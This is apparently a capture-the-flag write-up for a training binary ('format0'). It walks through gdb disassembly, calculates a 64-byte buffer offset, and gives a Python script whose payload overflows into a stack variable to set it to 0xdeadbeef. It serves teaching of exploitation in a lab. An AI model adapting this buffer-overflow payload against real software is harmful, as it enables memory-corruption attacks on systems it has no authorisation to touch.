

```as
(gdb) disas main
Dump of assembler code for function main:
0x0804842b <main+0>:	push   ebp
0x0804842c <main+1>:	mov    ebp,esp
0x0804842e <main+3>:	and    esp,0xfffffff0
0x08048431 <main+6>:	sub    esp,0x10
0x08048434 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048437 <main+12>:	add    eax,0x4
0x0804843a <main+15>:	mov    eax,DWORD PTR [eax]
0x0804843c <main+17>:	mov    DWORD PTR [esp],eax
0x0804843f <main+20>:	call   0x80483f4 <vuln>
0x08048444 <main+25>:	leave  
0x08048445 <main+26>:	ret    
End of assembler dump.

(gdb) disas vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   ebp
0x080483f5 <vuln+1>:	mov    ebp,esp
0x080483f7 <vuln+3>:	sub    esp,0x68
0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510 ; "you have hit the target correctly :)"
0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:	leave  
0x0804842a <vuln+54>:	ret    
End of assembler dump.
```


```as
0x08048434 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048437 <main+12>:	add    eax,0x4
0x0804843a <main+15>:	mov    eax,DWORD PTR [eax]
0x0804843c <main+17>:	mov    DWORD PTR [esp],eax
0x0804843f <main+20>:	call   0x80483f4 <vuln>
```
The first `main+9` to third line `main+15` is about getting the `argv[1]`. The last line is about pushing `argv[1]` onto the top of stack `<main+17>: mov DWORD PTR [esp],eax` which later it will be used by `vuln()` for its argument.

```as
0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
...
0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
```
There is some variable `ebp-0xc` that is set with `0x0`, and then later it will be compared with some constant `0xdeadbeef` which we need to pass the test and it will be the end of this challenge. Here is the comparasion with the actual source code:
```c
volatile int target;
target = 0;
...
if(target == 0xdeadbeef) {
	...	
}
```

Examine `ebp-0xc`, and here is the detail, later we will use it 
```as
(gdb) x/wx $ebp-0xc
0xbffff72c:	0x00000000
```


```as
0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
```

The first `vuln+13` and the second line `vuln+16` are probably our command line argument `argv[1]`:
```as
(gdb) x/wx $ebp+0x8
0xbffff740:	0xbffff946
(gdb) x/wx 0xbffff946
0xbffff946:	0x41414141

0xbffff740 -> 0xbffff946 -> 0x41414141
```

These specific line code are where our buffer located:
```as
0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
```
examining its detail
```as
(gdb) x/wx $ebp-0x4c
0xbffff6ec:	0x00000001
```
calculating the buffer, assuming we are not given the source code then we could identify the buffer like this: by substracting the starting address of buffer `ebp-0x4c`, and the next variable which is `ebp+0xc`
```as
(gdb) p/x $ebp-0xc - ($ebp-0x4c)
$6 = 0x40
(gdb) p/s $ebp-0xc - ($ebp-0x4c)
$7 = 64
```

Finally to verify whether it's correct 64 bytes or not, we will just assume it's true first, and later determine, so here is the script:

```py
import string
import struct

pad = ""
for i, c in enumerate(string.ascii_uppercase):
    pad += c * 4
    if (int(i) + 1) * 4 == 64:
        break

cmpp = struct.pack("I",0xdeadbeef)
payload = pad + cmpp
print(payload)
```

Test it:
```bash
$ python /tmp/a.py > /tmp/a
$ ./format0 "$(cat /tmp/a)"
you have hit the target correctly :)
```

Also in gdb we use it like:
```as
r "$(cat /tmp/a)"
```

Here is the detail:
```as
(gdb) 
you have hit the target correctly :)
esp            0xbffff6d0	0xbffff6d0
ebp            0xbffff738	0xbffff738
eip            0x8048429	0x8048429 <vuln+53>
0xbffff6d0:	0x08048510	0xbffff946	0x080481e8	0xbffff768
0xbffff6e0:	0xb7fffa54	0x00000000	0xb7fe1b28	0x41414141
0xbffff6f0:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff700:	0x46464646	0x47474747	0x48484848	0x49494949
0xbffff710:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xbffff720:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0xdeadbeef
0xbffff730:	0xb7fd8300	0xb7fd7ff4	0xbffff758	0x08048444
0xbffff740:	0xbffff946	0xb7ff1040	0x0804846b	0xb7fd7ff4
0xbffff750:	0x08048460	0x00000000	0xbffff7d8	0xb7eadc76
0xbffff760:	0x00000002	0xbffff804	0xbffff810	0xb7fe1848
0x8048429 <vuln+53>:	leave  
0x804842a <vuln+54>:	ret    
```
